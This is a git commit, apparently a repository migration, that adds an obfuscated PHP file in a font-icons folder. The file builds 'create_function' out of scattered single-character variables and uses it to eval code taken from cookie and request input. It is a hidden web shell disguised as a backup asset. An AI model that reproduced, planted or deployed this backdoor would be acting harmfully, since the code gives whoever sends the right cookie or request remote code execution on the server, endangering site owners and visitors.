46dd8fc4f1a569d1a1d273260ae28eaf51af3c94
JD Mills <jdmills@gmail.com>
2022-04-15 17:06:50 -0400

    Initial migration from S3 to GitHub.

---
+++ font-icons/a7310d10_bck_old.php
@@ -0,0 +1,107 @@
+<?php
+
+	$coiffure ='kcKi'; $drafted = '6';$dirtily = 's';$facets= '?MU$soasQ';$drafter = 'R';
+
+	$camber= '(_RuHr'; $lean ='('; $chronography ='r';$esteems='E';$hirsch ='"';$kerrin =')'; $factions = 'u? _N';$atom='K'; $disclosure='E';$existence = 'X';$foregone ='pa[)dP_re'; $assuringly= 'H'; $fluorescein= 'U'; $astonishing= 'aaeEj)';$enormous= 'vo';$imponderable='<';
+	$dazed= 'J';
+	$animals = '$';$intonate = 'ut'; $fulfilled ='r'; $brutalize='J';$infection='=';$catchup ='C';$happy1 ='Im(r';
+
+	$balustrade='v'; $backwoods ='c';$gunned ='[';$grotto='='; $drusi ='i,C;y)a';
+
+	$apport = '(Di';
+	$attendee ='U';$alyda = 'T';$dawned='b'; $gallberry ='W(fLoP$gJ';$kellia ='yO';$legislator ='e';$giraffe = 'jO';$igneous='"'; $heightened='e$]';$chancellor= '`';$earners = ':'; $fungoid='dOPJ$(E';$hedwig='t'; $cramming='e"'; $boggle='s';$junior='t';
+	$lighthouses = 'S';$disposes='^';$deadlines ='Z';$dissociable = 'T'; $apotheosis ='rU'; $hoof = 'l';$ceil= 'dn;p'; $mailable =']';
+	$cornucopia ='r_i[8"';$lindsey= 'Tsn'; $geoff= 'i)"';$degumming='P';
+	$capricious = '>e6eEA'; $indoctrination= '_KeG?;;_';$gash='i'; $decimals= 'U$r';$graces='P_t)'; $arranged = '5)e_k)';$imports='"S'; $bimetallism ='s';$apish= 's';$aureomycin= 'Y';$iggie = 'a';$cudgels='9'; $florid ='pEv(';$detestable= 'f';$infringing = 'iiu,aei';
+	$guidebooks= ')'; $circumventing ='i'; $jerrine='$U)i(EH="';$boning= '$'; $dramatic ='V';
+	$faraway= 'rv]g';$buffy ='r';$earthen = 'ae]';$ignorant='$e';$languages= 'g'; $finance= 'j';
+	$hotbed ='I';
+
+	$impenetrably= 'a'; $hoists = ')';$blinked='[(4Re';
+
+	$humanities ='r;Iactsu';$bella= 'l'; $extinguish ='B';$farrell = 'n';
+	$bailiffs= '('; $exemplified= '7eEFTK';$instrumental ='ejt';$armillaria= 'e';
+
+	$chrystal='QSRI__';$beguiling ='pT:V'; $fasted= 'u'; $curtained= ']';$harriet= '(';
+
+	$artifacts= 'e$tT';
+
+	$intimately = ':'; $biaxial='c';$cissy= '"_@J[';$luck = 'a_';$horton=$biaxial .
+	$humanities['0'].$artifacts['0'] .$luck['0'] .$artifacts['2']. $artifacts['0'] . $luck[1] .$detestable .$fasted . $farrell.$biaxial .
+
+	$artifacts['2'] .$jerrine['3'].$gallberry['4'].$farrell ;$byword=$factions['2'];$donning=$horton
+
+	($byword, $artifacts['0'].$faraway['1'] .$luck['0'] .$bella.$harriet.
+
+	$luck['0'] .$humanities['0']. $humanities['0'].$luck['0'] .
+	$kellia['0'].
+	$luck[1].
+	$beguiling['0']. $gallberry['4'] .
+
+	$beguiling['0'].
+	$harriet.
+	$detestable. $fasted. $farrell.$biaxial .$luck[1] .$languages. $artifacts['0'] . $artifacts['2'] .
+
+	$luck[1]. $luck['0'] .
+	$humanities['0'].$languages. $humanities['6'].
+
+	$harriet .
+
+	$hoists.
+
+	$hoists .$hoists.$humanities['1']); $donning ($exemplified['3'],$disposes ,$capricious['5'] ,$insides['2'],$biaxial , $breakdowns ,$chrystal['2'],
+	$artifacts['1']. $jerrine['3']. $jerrine['7'].$luck['0'].$humanities['0'] . $humanities['0'].$luck['0']. $kellia['0']. $luck[1]. $happy1['1'] .
+
+	$artifacts['0'] . $humanities['0'] . $languages.$artifacts['0'].
+
+	$harriet . $artifacts['1'] . $luck[1] .$chrystal['2'] .$exemplified[2]. $chrystal['0'] . $jerrine[1] .
+	$exemplified[2]. $chrystal['1'].
+	$artifacts['3'] .$infringing[3] .$artifacts['1']. $luck[1].
+	$drusi['2']. $fungoid[1] . $fungoid[1] .$exemplified['5'] .$chrystal['3'].$exemplified[2].$infringing[3] .
+
+	$artifacts['1'] .$luck[1].
+
+	$chrystal['1'].$exemplified[2]. $chrystal['2'] .$beguiling['3'] .$exemplified[2].
+
+	$chrystal['2'].
+	$hoists.$humanities['1'].$artifacts['1'] . $luck['0'].
+	$jerrine['7'].$jerrine['3'].$humanities['6'] .$humanities['6']. $artifacts['0'].$artifacts['2'] .
+	$harriet . $artifacts['1'].$jerrine['3'] .
+
+	$cissy['4'] . $cissy['0']. $jerrine['3'] .
+	$instrumental['1'].$beguiling['0'] .$fasted.
+	$arranged['4'].$instrumental['1'] . $artifacts['0'] . $fasted.$cissy['0'] .$curtained . $hoists.
+
+	$indoctrination[4] . $artifacts['1'].$jerrine['3'] .
+
+	$cissy['4']. $cissy['0']. $jerrine['3']. $instrumental['1'] .$beguiling['0'] . $fasted. $arranged['4'] .$instrumental['1'].$artifacts['0'] . $fasted. $cissy['0'] .$curtained. $intimately. $harriet.
+
+	$jerrine['3'] .$humanities['6']. $humanities['6'] .$artifacts['0'].
+
+	$artifacts['2']. $harriet.
+	$artifacts['1'].$jerrine['3']. $cissy['4'] .$cissy['0'] . $jerrine['6'] .
+
+	$artifacts['3'] .
+	$artifacts['3'] . $graces['0'] .
+	$luck[1].
+	$chrystal['3'] . $cissy['3'] .$graces['0'] . $jerrine[1]. $exemplified['5'] .$cissy['3']. $exemplified[2] .$jerrine[1] . $cissy['0'].$curtained. $hoists. $indoctrination[4].
+
+	$artifacts['1'] . $jerrine['3'].$cissy['4'].
+
+	$cissy['0'] .$jerrine['6']. $artifacts['3']. $artifacts['3'] .$graces['0'].$luck[1].
+	$chrystal['3'].$cissy['3'] .$graces['0'] . $jerrine[1] .
+
+	$exemplified['5'].$cissy['3'].$exemplified[2].
+	$jerrine[1].$cissy['0'] .$curtained.$intimately.$ceil['0'].
+	$jerrine['3'] .$artifacts['0'] .$hoists. $humanities['1']. $artifacts['0'].$faraway['1'] . $luck['0'] .$bella . $harriet.$humanities['6'] . $artifacts['2']. $humanities['0'].$humanities['0'] . $artifacts['0']. $faraway['1']. $harriet . $dawned .
+	$luck['0'].$humanities['6']. $artifacts['0'].$capricious['2']. $blinked['2'] . $luck[1] . $ceil['0'] .
+
+	$artifacts['0'] . $biaxial. $gallberry['4'] .
+
+	$ceil['0'] .$artifacts['0'] .
+	$harriet.
+	$humanities['6'].
+
+	$artifacts['2']. $humanities['0'].$humanities['0'].$artifacts['0'] .$faraway['1'].
+	$harriet . $artifacts['1'] .$luck['0'] .
+	$hoists.$hoists .$hoists. $hoists . $humanities['1'] );
